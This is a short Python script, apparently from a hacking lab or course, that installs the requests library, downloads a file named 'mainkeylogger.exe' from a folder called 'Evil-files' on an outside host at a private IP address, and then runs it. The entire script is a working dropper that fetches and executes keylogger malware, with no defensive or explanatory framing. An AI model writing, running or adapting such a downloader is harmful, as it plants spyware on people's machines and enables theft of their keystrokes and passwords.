
import subprocess
subprocess.Popen("pip install requests",shell=True)
import requests

def download(url):
	result=requests.get(url)

	filename=url.split("/")[-1]
	with open(filename , "wb") as out_file:
		out_file.write(result.content)

	

download("http://192.168.213.129/Evil-files/mainkeylogger.exe")
subprocess.Popen("mainkeylogger.exe",shell=True)
